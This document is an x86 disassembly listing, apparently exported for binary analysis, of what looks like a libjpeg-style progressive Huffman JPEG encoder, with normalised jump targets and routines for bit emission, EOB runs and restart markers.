pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x4c ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x5c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_42f2d0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp - 0x4 ]
mov dl [ ebp + 0xc ]
mov [ ecx + 0xc ] dl
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ eax + 0x12c ] 0x0
sete cl
mov [ ebp - 0x8 ] cl
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x134 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
and eax 0xff
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_42ff70
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_42fe40
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_42fbd0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_42f510
jmp r-xdata
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
push 0x3e8
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_430290
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] sub_430300
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0xe4 ]
jge r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xbc ]
mov [ eax + 0x44 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xe8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x24 ] 0x0
mov ecx [ ebp - 0x8 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x34 ] edx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x134 ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 4 + 0x4c ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov al [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42dc30
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x32
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x10 ] 0x4
jl r-xdata
mov eax [ ebp + 0xc ]
and eax 0xff
test eax eax
je r-xdata
push 0x404
push 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x5c ]
push ecx
call memset
add esp 0xc
jmp r-xdata
push 0x404
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0x5c ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + eax * 4 + 0x5c ] 0x0
jne r-xdata
jmp r-xdata
sub_42f510
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x138 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x100 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_42f950
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xbc ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x104 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xe8 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
movsx eax [ edx ]
mov ecx [ ebp - 0x1c ]
sar eax cl
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
sub eax [ edx + ecx * 4 + 0x24 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + ecx * 4 + 0x24 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
mov edx [ ebp - 0x8 ]
neg edx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xbc ]
mov [ ecx + 0x44 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
and edx 0x7
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
cmp [ ebp - 0x10 ] 0xb
jle r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x8 ]
sar edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_42f8d0
add esp 0xc
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x6
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_42f700
add esp 0xc
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
sub_42f700
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x28
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx 0x1
mov ecx [ ebp + 0x10 ]
shl edx cl
sub edx 0x1
mov eax [ ebp - 0x4 ]
and eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx 0x18
sub ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
shl edx cl
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
or ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x1c ] edx
mov edx [ ebp - 0x4 ]
sar edx 0x10
and edx 0xff
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov dl [ ebp - 0xc ]
mov [ ecx ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0xff
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42f860
add esp 0x4
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx 0x8
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_42f860
add esp 0x4
sub_42f860
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
mov edx [ ebp - 0x4 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
mov [ edx + 0x14 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
sub_42f8d0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x4c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
add eax [ ebp + 0x10 ]
movsx ecx [ eax + 0x400 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42f700
add esp 0xc
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x5c ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
add eax 0x1
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x5c ]
mov edx [ ebp + 0x10 ]
mov [ ecx + edx * 4 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f950
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_42faa0
add esp 0x4
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xc ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
cmp [ edx + 0x12c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42fa60
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ edx ] 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx 0xd0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov [ ecx ] dl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42f860
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0xe4 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42f860
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x24 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_42fa60
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0x7
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_42f700
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42faa0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x8 ] 0xe
jle r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0x4
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42f8d0
add esp 0xc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp - 0x4 ]
sar eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x40 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42fb80
add esp 0xc
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] 0x0
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42f700
add esp 0xc
sub_42fb80
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov edx [ ebp + 0xc ]
movsx eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42f700
add esp 0xc
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x10 ]
sub eax 0x1
mov [ ebp + 0x10 ] eax
jmp r-xdata
sub_42fbd0
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x130 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x138 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ edx + 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xbc ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x12c ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f950
add esp 0x8
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ecx * 4 + r--data ]
mov eax [ ebp - 0x24 ]
movsx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xbc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x38 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x38 ] 0x7fff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_42faa0
add esp 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x20 ]
sar edx cl
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x20 ]
sar edx cl
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
not eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xbc ]
mov [ ecx + 0x44 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
and edx 0x7
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x38 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0xf
jle r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_42faa0
add esp 0x4
mov [ ebp - 0x10 ] 0x1
push 0xf0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f8d0
add esp 0xc
mov ecx [ ebp - 0x14 ]
sub ecx 0x10
mov [ ebp - 0x14 ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0xa
jle r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x4
add eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f8d0
add esp 0xc
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f700
add esp 0xc
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x6
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp - 0x8 ]
sar edx 0x1
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_42fe40
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x138 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x100 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_42f950
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movsx eax [ edx ]
mov [ ebp - 0x8 ] eax
push 0x1
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sar edx cl
push edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42f700
add esp 0xc
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov [ edx + 0x44 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
and eax 0x7
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] eax
